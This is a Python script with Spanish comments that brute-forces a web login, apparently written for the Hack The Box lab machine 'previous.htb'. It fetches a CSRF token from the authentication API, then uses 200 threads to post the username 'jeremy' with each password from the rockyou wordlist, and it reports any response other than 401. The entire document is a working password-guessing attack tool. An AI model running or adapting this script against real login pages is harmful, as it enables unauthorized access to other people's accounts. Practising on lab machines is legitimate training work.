#!/usr/bin/python3

import threading
import requests

base_url = "http://previous.htb"

def trypass(password):
    with requests.Session() as s:
        # 1. Pedir CSRF
        r = s.get(f"{base_url}/api/auth/csrf")
        token = r.json()["csrfToken"]

        # 2. Enviar credenciales (ejemplo de lab)
        data = {
            "csrfToken": token,
            "username": "jeremy",
            "password": password,
            "callbackUrl": f"{base_url}/",
            "json": "true"
        }
        r2 = s.post(f"{base_url}/api/auth/callback/credentials", data=data)
        sc = r2.status_code
        if sc != 401:
            print(f"password {password} gave sc {sc}")
        else:
            pass

FICHERO = "/usr/share/wordlists/rockyou.txt"
N_HILOS = 200

def worker(hilo_id):
    with open(FICHERO, "r") as f:
        for i, linea in enumerate(f):
            if i % N_HILOS == hilo_id:
                # Aquí procesas la línea que toca
                trypass(linea.strip())

# Crear y lanzar hilos
hilos = []
for i in range(N_HILOS):
    t = threading.Thread(target=worker, args=(i,))
    t.start()
    hilos.append(t)

# Esperar a que todos terminen
for t in hilos:
    t.join()
